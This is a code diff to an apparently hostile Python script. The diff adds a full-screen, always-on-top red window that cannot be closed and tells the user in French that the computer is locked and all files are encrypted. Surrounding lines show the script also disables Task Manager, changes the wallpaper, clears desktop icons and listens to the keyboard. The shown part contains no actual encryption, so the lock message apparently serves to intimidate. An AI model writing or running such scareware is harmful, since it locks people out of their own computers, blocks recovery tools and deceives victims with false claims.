@@ -15,6 +15,41 @@ import sys
 import threading
 from pynput import keyboard
 
+#<<
+
+
+def show_final_window(main_text="Votre ordinateur est vérouillé !", description="Tous vos fichiers ont étés encryptés."):
+    root = tk.Tk()
+    root.overrideredirect(True)  # Pas de barre de tache ni bordure
+    root.attributes("-topmost", True)
+    root.configure(bg="red")
+    
+    screen_width = root.winfo_screenwidth()
+    screen_height = root.winfo_screenheight()
+    window_width, window_height = 600, 300
+    x = (screen_width - window_width) // 2
+    y = (screen_height - window_height) // 2
+    root.geometry(f"{window_width}x{window_height}+{x}+{y}")
+
+    # Texte principal énorme et noir
+    main_label = tk.Label(root, text=main_text, font=("Arial", 48, "bold"), fg="black", bg="red")
+    main_label.pack(pady=(40, 10))
+
+    # Description en dessous
+    desc_label = tk.Label(root, text=description, font=("Arial", 20), fg="black", bg="red")
+    desc_label.pack()
+
+    # Interdire fermeture
+    def disable_event():
+        pass
+    root.protocol("WM_DELETE_WINDOW", disable_event)
+
+    root.mainloop()
+
+
+
+#>>
+
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
@@ -140,6 +175,7 @@ def main():
     disable_task_manager()
     set_wallpaper("photo.jpeg")
     clear_desktop_icons()
+    show_final_window()
     
     # Fermer la fenêtre et arrêter le listener après 5 secondes
     loading_window.after(5000, lambda: [loading_window.destroy(), listener.stop()])
